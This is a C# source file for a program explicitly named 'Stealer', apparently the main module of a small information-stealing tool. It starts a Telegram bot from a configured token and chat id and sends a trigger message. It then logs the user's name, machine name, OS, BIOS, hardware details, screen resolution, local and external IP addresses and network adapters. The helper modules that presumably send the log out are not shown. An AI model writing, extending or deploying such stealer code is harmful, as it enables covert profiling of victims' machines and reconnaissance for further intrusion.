using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Globalization;

using Logger;
using Network;
using Telegram;

using Config;

class Stealer
{
	static void Main()
	{
		Logger.logger log = new Logger.logger(Config.Config.logname, Config.Config.logstart);
		Telegram.telegram bot = new Telegram.telegram(Config.Config.token, Config.Config.id);
		
		bot.SendMessage(Config.Config.triggermessage);

		//Environment
		log.write("\n---COMMON---");
		
		log.write("User");
		log.write("L Username: " + Environment.UserName); //Default windows 10 user's params
		log.write("  L User Domain Name: " + Environment.MachineName);

		log.write("\nOS");
		log.GetComponent("Win32_OperatingSystem", "L OS Name: ", "Caption", ""); //OS getting
		log.write("  L OS Version: " + Environment.OSVersion.ToString());
		log.write("    L Culture: "+CultureInfo.CurrentCulture.Name); //culture
		
		log.write("\nBIOS");
		log.GetComponent("Win32_BIOS", "L BIOS Brand: ", "Manufacturer", "");  //BIOS getting
		log.GetComponent("Win32_BIOS", "  L BIOS Version: ", "Name", "");

		log.write("\nOther");
		log.write("L Where Ran: " + System.Reflection.Assembly.GetEntryAssembly().Location);
   
		//Hardware get
		log.write("\n---HARDWARE---");

		log.write("RAM");

		log.write("L Physical");
		log.GetComponent("Win32_OperatingSystem", "  L Total Memory: ","TotalVisibleMemorySize", "KB"); //TODO: convert memory to GB or MB maybe
		log.GetComponent("Win32_OperatingSystem", "  L Total Free Memory: ","FreePhysicalMemory", "KB");
		
		log.write("L Virtual");
		log.GetComponent("Win32_OperatingSystem", "  L Total Memory: ","TotalVirtualMemorySize", "KB"); //TODO: convert memory to GB or MB maybe
		log.GetComponent("Win32_OperatingSystem", "  L Total Free Memory: ","FreeVirtualMemory", "KB");

		log.write("\nCPU");
		log.GetComponent("Win32_Processor", "L CPU Name: ", "Name", ""); //Slow CPU get
		if (Environment.Is64BitProcess)
			log.write("  L (64-bit process)");
		else
			log.write("  L (32-bit process)");

		log.write("\nGPU");
		log.GetComponent("Win32_VideoController", "L GPU Name: ", "Name", ""); //GPU get
		
		log.write("\nMother board");
		log.GetComponent("Win32_BaseBoard", "L Mother Board Manufacturer: ", "Manufacturer", ""); //Mother board name and type gettng
		log.GetComponent("Win32_BaseBoard", "  L Mother Board Product: ", "Product", "");
		
		log.write("\nDisk");
		log.GetComponent("Win32_DiskDrive", "L Disk Drive Name: ", "Model", "");
		
		log.write("\nDisplay");
		log.write("L Screen Resolution: " + Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + Screen.PrimaryScreen.Bounds.Height.ToString());

		//Network
		log.write("\n---NETWORK---");

		log.write("IP");
		log.write("L Local IP: " + IP.GetLocalIPAddress());
		log.write("  L External IP: " + IP.GetExternalIPAdress());

		log.write("Network hardware");
		log.write("L Network Adapter: ");
		log.GetComponent("Win32_NetworkAdapter", "  L ", "Name", "");
		Console.ReadKey();
	}
}